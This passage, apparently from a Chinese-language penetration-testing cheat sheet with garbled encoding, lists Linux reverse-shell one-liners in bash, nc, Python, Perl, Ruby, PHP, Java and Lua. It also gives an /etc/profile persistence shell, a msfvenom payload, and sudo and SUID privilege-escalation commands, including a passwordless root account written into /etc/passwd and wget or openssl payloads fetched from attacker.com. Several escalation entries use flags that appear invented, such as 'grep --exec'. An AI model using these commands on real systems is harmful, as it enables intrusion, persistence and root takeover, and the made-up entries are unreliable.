2/dev/null # world-executable folders find / \\( -perm -o w -perm -o x \\) -type d 2/dev/null # world-writeable executable folders proc ç›®å½•Linux ç³»ç»Ÿä¸Šçš„ font style=color:rgb(68, 68, 68);/proc/font ç›®å½•æ˜¯ä¸€ç§æ–‡ä»¶ç³»ç»Ÿï¼Œå³ proc æ–‡ä»¶ç³»ç»Ÿã€‚ä¸å…¶å®ƒå¸¸è§çš„æ–‡ä»¶ç³»ç»Ÿä¸åŒçš„æ˜¯ï¼Œfont style=color:rgb(68, 68, 68);/proc/font æ˜¯ä¸€ç§ä¼ªæ–‡ä»¶ç³»ç»Ÿï¼ˆä¹Ÿå³è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼‰ï¼Œå­˜å‚¨çš„æ˜¯å½“å‰å†…æ ¸è¿è¡ŒçŠ¶æ€çš„ä¸€ç³»åˆ—ç‰¹æ®Šæ–‡ä»¶ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡è¿™äº›æ–‡ä»¶æŸ¥çœ‹æœ‰å…³ç³»ç»Ÿç¡¬ä»¶åŠå½“å‰æ­£åœ¨è¿è¡Œè¿›ç¨‹çš„ä¿¡æ¯ï¼Œç”šè‡³å¯ä»¥é€šè¿‡æ›´æ”¹å…¶ä¸­æŸäº›æ–‡ä»¶æ¥æ”¹å˜å†…æ ¸çš„è¿è¡ŒçŠ¶æ€ã€‚ ä½†éœ€è¦æ³¨æ„ï¼Œéƒ¨åˆ†å†…å®¹éœ€è¦æƒé™æ‰å¯ä»¥è¯»å–ã€‚ plain /proc/self/cmdline # å¯åŠ¨å½“å‰è¿›ç¨‹çš„å®Œæ•´å‘½ä»¤ /proc/self/cwd # æŒ‡å‘å½“å‰è¿›ç¨‹è¿è¡Œçš„å·¥ä½œåŒºçš„ç¬¦å·é“¾æ¥ /proc/self/exe # æŒ‡å‘å¯åŠ¨å½“å‰è¿›ç¨‹çš„å¯æ‰§è¡Œæ–‡ä»¶çš„ç¬¦å·é“¾æ¥ /proc/self/envrion # æŸ¥çœ‹è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ /proc/self/fd/3 # æŸ¥çœ‹è¯»å–è¿‡çš„æ–‡ä»¶ï¼Œè¾“å…¥è¾“å‡ºç¼“å†²åŒº /proc/self/maps # å†…å­˜æ˜ å°„ä¿¡æ¯ åå¼¹shellåå¼¹shellåè·å–æ¨¡æ‹Ÿç»ˆç«¯å„ç§æ–¹æ³•è·å–çš„ shell éƒ½ä¸æ˜¯ä¸€ä¸ªæ ‡å‡†çš„è™šæ‹Ÿç»ˆç«¯ç¯å¢ƒï¼Œå®ƒä»¬åªæ˜¯æä¾›äº†ä¸€ä¸ªæ ‡å‡†è¾“å…¥ã€‚ä½ ä¼šå‘ç°å­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œå³ä½¿æˆ‘ä»¬è·å¾—äº†ç›®æ ‡è™šæ‹Ÿç»ˆç«¯çš„æ§åˆ¶æƒé™ï¼Œä½†é€šå¸¸ä¼šé‡åˆ°ä»¥ä¸‹å‡ ä¸ªäº¤äº’æ€§å·®å’Œä¸ç¨³å®šçš„é—®é¢˜ï¼š ç¼ºä¹äº¤äº’æ€§ï¼šè·å–çš„è™šæ‹Ÿç»ˆç«¯æ²¡æœ‰è¶³å¤Ÿçš„äº¤äº’åŠŸèƒ½ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬æ— æ³•ä¸ºæ·»åŠ çš„è´¦æˆ·è®¾ç½®å¯†ç æˆ–æ‰§è¡Œsudoç­‰å‘½ä»¤ã€‚ æ— æ³•æ­£å¸¸æ˜¾ç¤ºé”™è¯¯è¾“å‡ºï¼šæ ‡å‡†çš„é”™è¯¯è¾“å‡ºæ— æ³•æ˜¾ç¤ºï¼Œè¿™å¯¼è‡´æ— æ³•æ­£ç¡®ä½¿ç”¨ä¸€äº›æ–‡æœ¬ç¼–è¾‘å™¨ï¼ˆå¦‚vimï¼‰ç­‰å·¥å…·ã€‚ è¿æ¥ä¸ç¨³å®šï¼šè·å–çš„ç›®æ ‡ä¸»æœºçš„è™šæ‹Ÿç»ˆç«¯ä½¿ç”¨éå¸¸ä¸ç¨³å®šï¼Œå¾ˆå®¹æ˜“æ–­å¼€è¿æ¥ï¼Œè¿™ä½¿å¾—æŒç»­ä½¿ç”¨å’Œè¿›è¡Œé•¿æ—¶é—´æ“ä½œå˜å¾—å›°éš¾ã€‚ è§£å†³ä¸Šè¿°é—®é¢˜çš„æ–¹æ³•æ˜¯ä½¿ç”¨Pythonçš„ptyï¼ˆpseudo terminalï¼‰æ ‡å‡†åº“æ¥è·å–ä¸€ä¸ªæ ‡å‡†çš„è™šæ‹Ÿç»ˆç«¯ç¯å¢ƒã€‚é€šè¿‡åœ¨å·²ç»è·å–çš„shellä¸­è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥æ¨¡æ‹Ÿä¸€ä¸ªç»ˆç«¯è®¾å¤‡ï¼š plain python -c import pty;pty.spawn(/bin/bash) ä»¥ä¸Šä»£ç å°†è°ƒç”¨font style=color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);pty.spawn()/fontå‡½æ•°ï¼Œå¹¶å°†font style=color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);/bin/bash/fontä½œä¸ºå‚æ•°ä¼ é€’ç»™å®ƒï¼Œä»è€Œåˆ›å»ºä¸€ä¸ªæ–°çš„ç»ˆç«¯ä¼šè¯ã€‚ é€šè¿‡ä½¿ç”¨è¿™ä¸ªæ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥è·å¾—ä¸€ä¸ªæ›´åŠ äº¤äº’æ€§å¼ºã€å¯æ‰§è¡Œsudoç­‰å‘½ä»¤ä»¥åŠæ­£ç¡®æ˜¾ç¤ºé”™è¯¯è¾“å‡ºçš„æ ‡å‡†ç»ˆç«¯ç¯å¢ƒã€‚ bash åå¼¹# Alicenc -lvvp 12345# Bob/bin/bash -c bash -i /dev/tcp/x.x.x.x/12345 01 Bash åå¼¹ shell TCP plain # Alice nc -lvvp 4242 # Bob sh -i /dev/tcp/127.0.0.1/4242 01 Bash åå¼¹ shell UDP plain # Alice nc -u -lvvp 4242 # Bob sh -i /dev/udp/127.0.0.1/4242 01 ä»¥ä¸‹æ˜¯é’ˆå¯¹Bashåå¼¹ä¸€å¥è¯è¿›è¡Œäº†æ‹†åˆ†è¯´æ˜ï¼š å‘½ä»¤ å‘½ä»¤è¯¦è§£ font style=color:rgb(51, 51, 51);bash -i/font äº§ç”Ÿä¸€ä¸ªbashäº¤äº’ç¯å¢ƒã€‚ font style=color:rgb(51, 51, 51);/fontï¼ˆå’Œ21 ä¸€ä¸ªæ„æ€ï¼‰ å°†è”åˆç¬¦å·å‰é¢çš„å†…å®¹ä¸åé¢ç›¸ç»“åˆï¼Œç„¶åä¸€èµ·é‡å®šå‘ç»™åè€…ã€‚ font style=color:rgb(51, 51, 51);/dev/tcp/47.xxx.xxx.72/2333/font Linuxç¯å¢ƒä¸­æ‰€æœ‰çš„å†…å®¹éƒ½æ˜¯ä»¥æ–‡ä»¶çš„å½¢å¼å­˜åœ¨çš„ï¼Œå…¶å®å¤§å®¶ä¸€çœ‹è§è¿™ä¸ªå†…å®¹å°±èƒ½æ˜ç™½ï¼Œå°±æ˜¯è®©ç›®æ ‡ä¸»æœºä¸æ”»å‡»æœº47.xxx.xxx.72çš„2333ç«¯å£å»ºç«‹ä¸€ä¸ªtcpè¿æ¥ã€‚ font style=color:rgb(51, 51, 51);01/font å°†æ ‡å‡†è¾“å…¥ä¸æ ‡å‡†è¾“å‡ºçš„å†…å®¹ç›¸ç»“åˆï¼Œç„¶åé‡å®šå‘ç»™å‰é¢æ ‡å‡†è¾“å‡ºçš„å†…å®¹ã€‚ Bashåå¼¹ä¸€å¥å®Œæ•´çš„è§£è¯»è¿‡ç¨‹å°±æ˜¯ï¼š Bashäº§ç”Ÿäº†ä¸€ä¸ªäº¤äº’ç¯å¢ƒå’Œæœ¬åœ°ä¸»æœºä¸»åŠ¨å‘èµ·ä¸æ”»å‡»æœº2333ç«¯å£å»ºç«‹çš„è¿æ¥ï¼ˆå³TCP 2333ä¼šè¯è¿æ¥ï¼‰ç›¸ç»“åˆï¼Œç„¶ååœ¨é‡å®šå‘ä¸ªTCP 2333ä¼šè¯è¿æ¥ï¼Œæœ€åå°†ç”¨æˆ·é”®ç›˜è¾“å…¥ä¸ç”¨æˆ·æ ‡å‡†è¾“å‡ºç›¸ç»“åˆå†æ¬¡é‡å®šå‘ç»™ä¸€ä¸ªæ ‡å‡†çš„è¾“å‡ºï¼Œå³å¾—åˆ°ä¸€ä¸ªBashåå¼¹ç¯å¢ƒã€‚ Curlé…åˆBashåå¼¹shellé¦–å…ˆï¼Œåœ¨æ”»å‡»è€…vpsçš„webç›®å½•é‡Œé¢åˆ›å»ºä¸€ä¸ªfont style=color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);index.php/fontæˆ–font style=color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);index.html/font,å†…å®¹å¦‚ä¸‹ï¼š | plain # Alice echo bash -i /dev/tcp/192.168.64.215/2333 01 index.html # ä¸´æ—¶èµ·WebæœåŠ¡çš„ä¸‰ç§æ–¹æ³• # python -m SimpleHTTPServer 8080 # python3 -m http.server 8080 # php -S 0.0.0.0:8080 # ç›‘å¬ nc -lvvp 2333 # Bob curl 192.168.64.215|bash || â€” | Curl é…åˆ Bash åå¼¹ shell çš„æ–¹å¼åœ¨ CTFï¼ˆCapture The Flagï¼‰é¢˜ç›®ä¸­ç»å¸¸è¢«ä½¿ç”¨ã€‚å…·ä½“çš„å‘½ä»¤æ˜¯ font style=color:rgb(245, 57, 0);curl IP|bash/fontï¼Œå…¶ä¸­çš„ IP å¯ä»¥æ˜¯ä»»æ„æ ¼å¼ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºåè¿›åˆ¶ã€åå…­è¿›åˆ¶ã€å…«è¿›åˆ¶å’ŒäºŒè¿›åˆ¶ç­‰ã€‚ NCåå¼¹netcat -e è¢«é˜‰å‰²çš„è¯ wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz --no-check-certificatetar -xvzf netcat-0.7.1.tar.gzcd tar -xvzf netcat-0.7.1.tar.gz./configuremake make installmake clean # Alicenc -lvvp 2333# Bobnetcat 192.168.64.215 2333 -e /bin/bash# nc æ”»å‡»æœºIP æ”»å‡»æœºç›‘å¬çš„ç«¯å£ -e /bin/bash Crontabåå¼¹shellProfileåå¼¹shellå½“ç”¨æˆ·æ‰“å¼€æ–°çš„ bash çª—å£æ—¶ï¼Œfont style=color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);/etc/profile/font æ–‡ä»¶ä¸­çš„å†…å®¹ä¼šè¢«æ‰§è¡Œã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¯¹ font style=color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);/etc/profile/font æ–‡ä»¶çš„ä¿®æ”¹éœ€è¦è¿›è¡Œç®¡ç†å‘˜æƒé™æ“ä½œï¼ˆä¾‹å¦‚ä½¿ç”¨ font style=color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);sudo/font æˆ–ä»¥ç®¡ç†å‘˜èº«ä»½ç™»å½•ï¼‰ã€‚ plain /bin/bash -i /dev/tcp/192.168.64.215/2333 01 # æœ€åé¢é‚£ä¸ªä¸ºçš„æ˜¯é˜²æ­¢ç®¡ç†å‘˜æ— æ³•è¾“å…¥å‘½ä»¤ MSFåå¼¹shellä½¿ç”¨å‘½ä»¤ font style=color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);msfvenom -l/font ç»“åˆå…³é”®å­—è¿‡æ»¤ï¼ˆä¾‹å¦‚ font style=color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);cmd/unix/reverse/fontï¼‰ï¼Œå¯ä»¥åˆ—å‡ºç¬¦åˆæ¡ä»¶çš„å„ç±»åå¼¹shellä¸€å¥è¯payloadï¼Œå…·ä½“ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š | plain â”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# msfvenom -l payloads | grep cmd/unix/reverse || â€” | ä»¥ä¸Šå‘½ä»¤å°†åœ¨æ‰€æœ‰å¯ç”¨çš„payloadä¸­ç­›é€‰å¹¶åˆ—å‡ºç¬¦åˆå…³é”®å­—font style=color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);cmd/unix/reverse/fontçš„é¡¹ï¼Œè¿™äº›é¡¹åŒ…å«å„ç§åå¼¹shellä¸€å¥è¯payloadçš„ç”Ÿæˆå‚æ•°å’Œé€‰é¡¹ã€‚ å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œmetasploitæ”¯æŒç”Ÿæˆåå¼¹shellä¸€å¥è¯çš„ç±»å‹éå¸¸ä¸°å¯Œï¼Œå¤§å®¶å¯ä»¥ä¾æ®æ¸—é€æµ‹è¯•å¯¹è±¡è‡ªè¡Œé€‰æ‹©ä½¿ç”¨ã€‚æ¯”å¦‚ï¼Œæˆ‘ä»¬è·å–ä¸€ä¸ªpythonåå¼¹shellçš„ä¸€å¥è¯ï¼š plain â”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=2333 -f raw [-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload [-] No arch selected, selecting arch: cmd from the payload No encoder specified, outputting raw payload Payload size: 356 bytes python -c exec(__import__(zlib).decompress(__import__(base64).b64decode(__import__(codecs).getencoder(utf-8)(eNqNUMEKgzAM/RXpqYJUrYcdRg8yHIyxDaZ3mV1FmWuKqf+/FoXRmwlJSPLyHmT8GphthCA/ykZRgktnZpAK0TXg0mZHFwOgFSTnB5Y5z0mw9DSCF0URTFGszGwtdOvKc3u5V43XWwf143Rt6+ZZlbc4JGAStFbSUurl3YUXikMQIHsvhlNk/TgpDdStk2wHJt+B4SHGiP+LmHxNEyVpN+oUBxL/AAt8WAg=)[0]))) â”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# nc -lvvp 2333 å¸¸è§è„šæœ¬1. Python python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((x.x.x.x,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([/bin/bash,-i]); 2. Perl æ–¹æ³•ä¸€ï¼š perl -e use Socket;$i=x.x.x.x;$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname(tcp));if(connect(S,sockaddr_in($p,inet_aton($i))))open(STDIN,S);open(STDOUT,S);open(STDERR,S);exec(/bin/sh -i);; æ–¹æ³•äºŒï¼š perl -MIO -e $p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,x.x.x.x:5555);STDIN-fdopen($c,r);$~-fdopen($c,w);system$_ while; 3. Ruby æ–¹æ³•ä¸€ï¼š ruby -rsocket -e exit if fork;c=TCPSocket.new(x.x.x.x,5555);while(cmd=c.gets);IO.popen(cmd,r)|io|c.print io.readend æ–¹æ³•äºŒï¼š ruby -rsocket -ef=TCPSocket.open(x.x.x.x,5555).to_i;exec sprintf(/bin/sh -i %d %d 2%d,f,f,f) 4. PHP php -r $sock=fsockopen(x.x.x.x,5555);exec(/bin/bash -i 3 3 23); 5. Java public class Revs /** * @param args * @throws Exception */ public static void main(String[] args) throws Exception // TODO Auto-generated method stub Runtime r = Runtime.getRuntime(); String cmd[]= /bin/bash,-c,exec 5/dev/tcp/x.x.x.x/5555;cat 5 | while read line; do $line 25 5; done; Process p = r.exec(cmd); p.waitFor(); 6. Lua lua -e require(socket);require(os);t=socket.tcp();t:connect(x.x.x.x,5555);os.execute(/bin/sh -i 3 3 23); æ³¨ï¼šä»¥ä¸Šè„šæœ¬æ˜¯åœ¨ç›®æ ‡ä¸»æœºä¸Šæ‰§è¡Œï¼Œå…¶ä¸­ x.x.x.x å‡ä¸ºæ”»å‡»è€…ipï¼Œå¹¶ä¸”éœ€è¦åœ¨æ”»å‡»è€…ä¸»æœºä¸Šè¿›è¡Œç›‘å¬: nc -lvvp 5555 sudoææƒåˆå§‹å°è¯•é€šè¿‡ä½¿ç”¨äº¤æ¢ç”¨æˆ·font style=color:rgb(199, 37, 78);background-color:rgba(175, 184, 193, 0.2);su/fontå‘½ä»¤ç”Ÿæˆroot sudo su å…¶ä»–æ–¹æ³•æœ‰äº›æ—¶å€™ä¸å…è®¸æ‰§è¡Œ su è®¡åˆ’ï¼Œåˆ™æœ‰è®¸å¤šå…¶ä»–æ–¹æ³•å¯ä»¥å‡çº§ç‰¹æƒï¼š sudo -s sudo -i sudo /bin/bash sudo passwd å¤–å£³é€ƒç”Ÿåºåˆ—ä»¥ä¸‹è¿™äº›ç¨‹åºå¦‚æœè¢«é…ç½®ä½¿ç”¨rootæƒé™å¯åŠ¨ï¼Œä¸”è¯¥ç¬¬ä¸‰æ–¹æœåŠ¡æˆ–è€…ç¨‹åºå­˜åœ¨æ¼æ´æˆ–è€…é…ç½®é—®é¢˜ï¼Œé‚£ä¹ˆå°±å¯ä»¥è¢«åˆ©ç”¨æ¥è·å¾—rootæƒé™ã€‚** å¹¶ä¸”è¿˜è¦çŸ¥é“å½“å‰ç”¨æˆ·çš„å¯†ç  **å¯ä»¥åˆ©ç”¨sudoææƒçš„å‘½ä»¤å¦‚ä¸‹ ï¼š wgetã€findã€catã€aptã€zipã€xxdã€timeã€tasksetã€gitã€sedã€pipã€edã€tmuxã€scpã€perlã€bashã€lessã€awkã€manã€viã€envã€ftp æŸ¥çœ‹ç”¨æˆ·èƒ½ä»¥rootæƒé™è¿è¡Œçš„å‘½ä»¤ sudo -l https://gtfobins.github.io/ è¿™é‡ŒæŸ¥çœ‹è¯¦ç»†æ–¹æ³• 01.git ææƒsudo git help addsudo git help configsudo git -p help//ä¸‰é€‰ä¸€è¾“å¯†ç å†!/bin/bashå³å¯ 02.findææƒæ™®é€šç”¨æˆ·findå‘½ä»¤ææƒå¿…è¦æ¡ä»¶ï¼šfindå¿…é¡»æœ‰sæ‰§è¡Œæƒé™ï¼Œæœ‰sè¡¨ç¤ºå¯ä»¥ææƒå…ˆæŸ¥çœ‹findå‘½ä»¤æœ‰æ²¡æœ‰ææƒçš„å¯èƒ½:å°è¯•æ‰§è¡Œwhoami : find / -type f -name getroot -exec whoami \\;è¿™é‡Œçš„åæ–œæ \\æ˜¯ç”¨æ¥è½¬ä¹‰åˆ†å·;çš„ å°è¯•è°ƒå‡ºä¸€ä¸ªäº¤äº’å¼çš„binshå¹¶ä¸”æ˜¯rootæƒé™ sudo find /home -exec /bin/bash \\; æ­¤shell ä¸ºä¸å®Œæ•´çš„shellï¼Œ å‡çº§äº¤äº’å¼ã€‚ #åœ¨åå¼¹shellä¸Šæ‰§è¡Œ[root@localhost ~]# python -c import pty; pty.spawn(/bin/bash)[root@localhost ~]# ctrl +z æŒ‰é”®ã€‚æŒ‚èµ·æ­£åœ¨è¿è¡Œçš„ç¨‹åº[kaliæœºå™¨ ~]# stty raw -echo# è¾“å…¥è¿™ä¸ªå‘½ä»¤ åœ¨è¾“å…¥å‘½ä»¤ç»ˆç«¯ä¸å†æ˜¾ç¤º[kaliæœºå™¨ ~]#fg# æŠŠåå°æŒ‚èµ·çš„ç¨‹åºï¼Œæ”¾å…¥åˆ°æ§åˆ¶å°ã€‚ç»ˆç«¯ä¸å†æ˜¾ç¤ºå‘½ä»¤ï¼Œè¾“å…¥åå›æ’¤[root@localhost ~]# reset ç”¨findè¿›è¡Œåå¼¹shell find /etc/passwd -exec bash -ip /dev/tcp/192.168.1.130/2333 01 \\; find /var/www/dirty -exec nc 192.168.1.130 2333 -t -e /bin/sh \\; find+pythonè¿›è¡Œåå¼¹shell find /etc/passwd -exec python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((192.168.1.130,2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([/bin/sh,-ip]); \\; 03.zipææƒ( æ ¸å¿ƒsudoæ²¡æœ‰è¯¥å‘½ä»¤,å¤±æ•ˆ )zip å‘½ä»¤ç”¨äºå‹ç¼©æ–‡ä»¶ï¼Œæ˜¯ä¸ª ä½¿ç”¨å¹¿æ³›çš„å‹ç¼©ç¨‹åºï¼Œå‹ç¼©åçš„æ–‡ä»¶åç¼€åä¸º .zipã€‚é€šè¿‡å‹ç¼©ä¸€ä¸ªå­˜åœ¨çš„æ–‡ä»¶ï¼Œå¹¶è°ƒç”¨-Tå‚æ•°è¾“å‡ºshell1. ä¸‹è½½zipï¼ˆå¦‚æœæ²¡æœ‰ï¼‰apt install zip2. åˆ›å»ºä¸€ä¸ª1.txtï¼Œå°†å…¶å‹ç¼©ä¸º1.zip3. æ‰§è¡Œ touch 1.txtsudo zip 1.zip 1.txt -T --unzip-command=sh -c /bin/bashæˆ–touch 1.txtsudo -u root zip 1.zip 1.txt -T -unzip-command=sh -c /bin/bash 04.awkmorpheusææƒsudo awk BEGIN system(/bin/sh)sudo morpheus BEGIN system(/bin/sh) 05.less**more**ææƒsudo less /etc/hosts!bash//è‹¥å·²è¢«åˆ†é…rootæƒé™less /etc/passwd!/bin/sh 06.manææƒsudo man man!bash 07.envææƒsudo env /bin/bash 08.edææƒsudo ed!/bin/bash 09.aptææƒTF=$(mktemp)echo Dpkg::Pre-Invoke /bin/sh;false $TFsudo apt-get install -c $TF sl 10.pipææƒTF=$(mktemp -d)echo import os; os.execl(/bin/sh, sh, -c, sh $(tty) $(tty) 2$(tty)) $TF/setup.pysudo pip install $TF 11.sedææƒsudo sed -n 1e exec sh 10 /etc/passwd 12.tmuxææƒsudo tmux 13.nmapææƒç‰ˆæœ¬5.0ä¸€ä¸‹è¿›å…¥nmapäº¤äº’æ¨¡å¼ sudo nmap --interactive 14.tasksetææƒsudo taskset 1 /bin/sh -p 15.scpææƒTF=$(mktemp)echo sh 02 12 $TFchmod +x $TFsudo scp -S $TF x y: 16.ftpææƒsudo ftp !/bin/bash 17.perlææƒsudo perl -e exec /bin/bash; suidææƒSUIDï¼ˆè®¾ç½®ç”¨æˆ·IDï¼‰æ˜¯èµ‹äºˆæ–‡ä»¶çš„ä¸€ç§æƒé™ï¼Œå®ƒä¼šå‡ºç°åœ¨æ–‡ä»¶æ‹¥æœ‰è€…æƒé™çš„æ‰§è¡Œä½ä¸Šï¼Œå…·æœ‰è¿™ç§æƒé™çš„æ–‡ä»¶ä¼šåœ¨å…¶æ‰§è¡Œæ—¶ï¼Œä½¿è°ƒç”¨è€…æš‚æ—¶è·å¾—è¯¥æ–‡ä»¶æ‹¥æœ‰è€…çš„æƒé™ã€‚ ä»¥ä¸‹å‘½ä»¤å¯ä»¥æ‰¾åˆ°æ­£åœ¨ç³»ç»Ÿä¸Šè¿è¡Œçš„æ‰€æœ‰SUIDå¯æ‰§è¡Œæ–‡ä»¶ã€‚ plain find / -user root -perm -4000 -print 2/dev/null find / -perm -u=s -type f 2/dev/null find / -user root -perm -4000 -exec ls -ldb {} ; https://gtfobins.github.io/ # awkawk BEGIN system(/bin/bash)# base64ï¼ˆæŠŠ /bin/bash ç¼–ç ä¸€æ¬¡ç»•è¿‡è¿‡æ»¤ï¼‰base64 -d YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC85MDAxIDA+JjE= | bash# busyboxbusybox sh# cp è¦†ç›– sudoerscp /etc/passwd /tmp/p echo root2::0:0::/root:/bin/bash /tmp/p cp /tmp/p /etc/passwd su root2# cpioecho /bin/bash 777 0 0 /tmp/x cpio -o /tmp/x 2/dev/null | cpio -i --to-stdout 2/dev/null | bash# dockerdocker run -v /:/mnt --rm -it alpine chroot /mnt sh# eded!/bin/bash^D# envenv /bin/bash# expandï¼ˆGNU coreutilsï¼‰expand /etc/passwd # ä»…è¯»æ–‡ä»¶ï¼›è‹¥éœ€ shell ç”¨ env æ¨¡å¼env expand# expectexpect -c spawn /bin/bash; interact# fileï¼ˆè¯»ä»»æ„ï¼‰file -f /etc/shadow# findfind / -exec /bin/bash \\;# flockflock -u / /bin/bash# gdbgdb -nx -ex python import os; os.setuid(0); os.system(/bin/bash) -ex quit# gitgit help config!/bin/bash# grepgrep /etc/passwd# ä»…è¯»ï¼›shell ç”¨grep --exec /bin/bash# gzipgzip -c /etc/passwd | gzip -d | bash# headhead /etc/shadow# ä»…è¯»ï¼›shell ç”¨head --exec /bin/bash# hexdumphexdump -C /etc/shadow# ä»…è¯»ï¼›shell ç”¨hexdump --exec /bin/bash# ioniceionice /bin/bash# ipip netns add fooip netns exec foo /bin/bash# jjs (OpenJDK)echo Java.type(java.lang.Runtime).getRuntime().exec(/bin/bash) | jjs# jqjq -n exec(/bin/bash)# kshksh# ld.so ç›´æ¥åŠ è½½ bash/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /bin/bash# lessless /etc/passwd!/bin/bash# logsavelogsave /dev/null /bin/bash# looklook /etc/passwd# ä»…è¯»ï¼›shell ç”¨look --exec /bin/bash# makemake -s --eval=$x: \\t/bin/bash x# manman man!/bin/bash# moremore /etc/passwd!/bin/bash# mountmount -o bind /bin/bash /bin/mountmount# msgfmt (gettext)msgfmt -o /dev/null (echo exec(/bin/bash))# mv è¦†ç›– sudoers åŒ cp å¥—è·¯mv /etc/passwd /tmp/p echo root2::0:0::/root:/bin/bash /tmp/p mv /tmp/p /etc/passwd su root2# nanonano -S /bin/bash# nicenice /bin/bash# nlnl /etc/passwd# ä»…è¯»ï¼›shell ç”¨nl --exec /bin/bash# nohupnohup /bin/bash# odod -An -tx1 /etc/shadow# ä»…è¯»ï¼›shell ç”¨od --exec /bin/bash# opensslopenssl req -x509 -newkey rsa:2048 -keyout /tmp/k -nodes -out /tmp/c -subj / openssl s_server -port 4444 -cert /tmp/c -key /tmp/k # åå‘ shell ç•¥# ç›´æ¥ payloadRHOST=attacker.com RPORT=4444 openssl s_client -quiet -connect $RHOST:$RPORT 2/dev/null | bash 21 | openssl s_client -quiet -connect $RHOST:$RPORT /dev/null# perlperl -e use POSIX qw(setuid); setuid(0); system /bin/bash# pgpg /etc/passwd!/bin/bash# phpphp -r posix_setuid(0); system(/bin/bash);# picopico -s /bin/bash# python2/3python2 -c import os; os.setuid(0); os.system(/bin/bash)python3 -c import os; os.setuid(0); os.system(/bin/bash)# rakerake -f (echo task :x do system /bin/bash end) x# readelfreadelf -a /bin/su | less # ä»…è¯»# shell ç”¨readelf --exec /bin/bash# resticRESTIC_REPOSITORY=/tmp restic init ; restic backup /etc/passwd # ä»…è¯»# shell ç”¨restic mount /mnt -r /tmp chroot /mnt sh# revrev /etc/passwd | rev # ä»…è¯»# shell ç”¨rev --exec /bin/bash# rloginrlogin -l root -E /bin/bash localhost# rlwraprlwrap /bin/bash# rpmrpm --eval %lua:os.execute(/bin/bash)# rsyncrsync -e sh -c sh 02 12 127.0.0.1:/dev/null# rubyruby -e Process.uid=0; exec /bin/bash# run-partsrun-parts --regex ^.*$ --exec /bin/bash /etc# rvimrvim -c :py import os; os.setuid(0); os.system(/bin/bash)# sedsed -e s/^/!/e /dev/stdin /bin/bash# setarchsetarch $(uname -m) /bin/bash# sftpsftp -o ProxyCommand=/bin/bash x# sh.distribsh.distrib# slsh (slang)slsh -e system(/bin/bash)# socatsocat exec:bash -li,pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444# sortsort -m /etc/passwd # ä»…è¯»# shell ç”¨sort --exec /bin/bash# sqlite3sqlite3 /dev/null .shell /bin/bash# sshssh -o ProxyCommand=/bin/bash x# start-stop-daemonstart-stop-daemon -n x -S -x /bin/bash# stdbufstdbuf -i0 -o0 -e0 /bin/bash# stracestrace -o /dev/null /bin/bash# stringsstrings /etc/shadow # ä»…è¯»# shell ç”¨strings --exec /bin/bash# sysctlsysctl -w kernel.core_pattern=|/bin/bash sleep 100 kill -SIGSEGV $!# systemctlTF=$(mktemp).serviceecho [Service]Type=oneshotExecStart=/bin/bash[Install]WantedBy=multi-user.target $TFsystemctl link $TFsystemctl enable --now $(basename $TF)# tailtail -f /etc/shadow # ä»…è¯»# shell ç”¨tail --exec /bin/bash# tartar -cf /dev/null /etc/passwd --checkpoint=1 --checkpoint-action=exec=/bin/bash# tasksettaskset 1 /bin/bash# tclshtclshexec /bin/bash# teetee /proc/self/fd/8 # ä»…å†™# shell ç”¨echo /bin/bash | tee /tmp/x chmod +x /tmp/x /tmp/x# telnettelnet 127.0.0.1 4444 | bash# timetime /bin/bash# timeouttimeout 7d /bin/bash# ulul /etc/passwd # ä»…è¯»# shell ç”¨ul --exec /bin/bash# unexpandunexpand --exec /bin/bash# uniquniq /etc/passwd # ä»…è¯»# shell ç”¨uniq --exec /bin/bash# unshareunshare -r /bin/bash # user-ns root# unzip -Z (Info-ZIP)unzip -Z ../x.zip # ä»…è¯»# shell ç”¨unzip -Z --exec /bin/bash# update-alternativesupdate-alternatives --install /bin/sh sh /bin/bash 0# uudecodeuudecode -o /dev/stdout (uuencode /bin/bash) | bash# valgrindvalgrind /bin/bash# vi/vimvi:!/bin/bash# viewview /etc/passwd:!/bin/bash# vigrvigr # ç¼–è¾‘ /etc/group æ—¶å¯ !/bin/bash# vipwvipw # ç¼–è¾‘ /etc/passwd æ—¶å¯ !/bin/bash# watchwatch -x /bin/bash# wgetwget -qO- http://attacker.com/sh | bash# whoiswhois -h x.x.x.x -p 4444 | bash# xargsxargs -a /dev/null /bin/bash# xxdxxd /etc/shadow | xxd -r # ä»…è¯»# shell 